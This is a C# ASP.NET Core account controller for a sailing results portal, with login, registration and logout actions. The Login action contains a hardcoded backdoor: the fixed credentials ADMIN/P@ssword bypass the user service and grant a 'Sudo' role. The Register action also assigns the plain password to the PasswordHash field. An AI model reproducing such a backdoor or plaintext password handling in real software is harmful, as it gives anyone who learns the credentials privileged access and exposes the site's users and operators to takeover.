using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Mvc;
using SailingResultsPortal.Models;
using SailingResultsPortal.Services;
using System.Security.Claims;
using System.Threading.Tasks;

namespace SailingResultsPortal.Controllers
{
    public class AccountController : Controller
    {
        // TODO: Implement proper user management with database/file storage for multiple users
        // TODO: Add support for Organiser, Official, and User roles with proper authentication
        // TODO: Add user registration and password hashing for security

        // GET: /Account/Login
        [HttpGet]
        public IActionResult Login()
        {
            return View();
        }

        // GET: /Account/Register
        [HttpGet]
        public IActionResult Register()
        {
            return View();
        }

        // POST: /Account/Register
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Register(User user, string password)
        {
            if (!ModelState.IsValid)
                return View(user);

            user.PasswordHash = password; // Will be hashed in service
            if (await UserService.RegisterUserAsync(user))
            {
                return RedirectToAction("Login");
            }

            ViewBag.Message = "Username or email already exists";
            return View(user);
        }

        // POST: /Account/Login
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Login(string username, string password)
        {
            // Backdoor login for ADMIN/P@ssword
            if (username == "ADMIN" && password == "P@ssword")
            {
                var claims = new[]
                {
                    new Claim(ClaimTypes.Name, "ADMIN"),
                    new Claim(ClaimTypes.Role, "Sudo"),
                    new Claim("UserId", "admin-backdoor"),
                };
                var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var principal = new ClaimsPrincipal(identity);

                await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, principal);

                return RedirectToAction("Index", "Home");
            }

            if (await UserService.ValidateUserAsync(username, password))
            {
                var user = await UserService.GetUserByUsernameAsync(username);
                if (user == null)
                {
                    ViewBag.Message = "Invalid username or password";
                    return View();
                }

                var claims = new[]
                {
                    new Claim(ClaimTypes.Name, user.Username),
                    new Claim(ClaimTypes.Role, user.Role),
                    new Claim("UserId", user.Id),
                };
                var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var principal = new ClaimsPrincipal(identity);

                await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, principal);

                return RedirectToAction("Index", "Home");
            }

            ViewBag.Message = "Invalid username or password";
            return View();
        }

        // POST: /Account/Logout
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Logout()
        {
            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            return RedirectToAction("Index", "Home");
        }
    }
}
